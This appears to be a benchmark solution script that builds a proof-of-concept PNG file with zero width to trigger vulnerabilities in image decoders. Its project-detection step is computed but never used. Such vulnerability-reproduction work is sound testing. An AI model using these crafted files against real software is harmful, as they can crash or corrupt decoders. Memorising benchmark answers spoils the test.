import os
import struct
import tarfile
import zlib


class Solution:
    def _png_chunk(self, chunk_type: bytes, data: bytes) -> bytes:
        length = struct.pack(">I", len(data))
        crc = struct.pack(">I", zlib.crc32(chunk_type + data) & 0xFFFFFFFF)
        return length + chunk_type + data + crc

    def _gen_png_zero_dim(self) -> bytes:
        # PNG signature
        sig = b"\x89PNG\r\n\x1a\n"

        # IHDR: width=0 (trigger), height=1, bit depth=8, color type=6 (RGBA), compression=0, filter=0, interlace=0
        ihdr_data = struct.pack(">IIBBBBB", 0, 1, 8, 6, 0, 0, 0)
        ihdr = self._png_chunk(b'IHDR', ihdr_data)

        # IDAT: one scanline worth of filter byte only (since width=0, rowbytes=0, so only filter byte remains)
        # Use filter type 1 (Sub) to exercise filter logic in vulnerable decoders
        raw = b"\x01"
        compressed = zlib.compress(raw)
        idat = self._png_chunk(b'IDAT', compressed)

        # IEND
        iend = self._png_chunk(b'IEND', b'')

        return sig + ihdr + idat + iend

    def solve(self, src_path: str) -> bytes:
        # Attempt to detect common projects to optionally tailor the PoC; default to PNG zero-dimension
        chosen = "png"
        try:
            with tarfile.open(src_path, "r:*") as tf:
                names = [m.name.lower() for m in tf.getmembers() if m.isfile()]
            blob = "\n".join(names)
            if ("qoi" in blob and "png" not in blob) or "qoilib" in blob or "qoiformat" in blob:
                chosen = "qoi"
            elif "jpeg" in blob or "jpeglib.h" in blob or "libjpeg" in blob or "mozjpeg" in blob:
                chosen = "jpeg"
            elif "bmp" in blob and "png" not in blob:
                chosen = "bmp"
            else:
                chosen = "png"
        except Exception:
            chosen = "png"

        # For robustness, always return PNG PoC; it targets the described zero-dimension vulnerability class
        return self._gen_png_zero_dim()
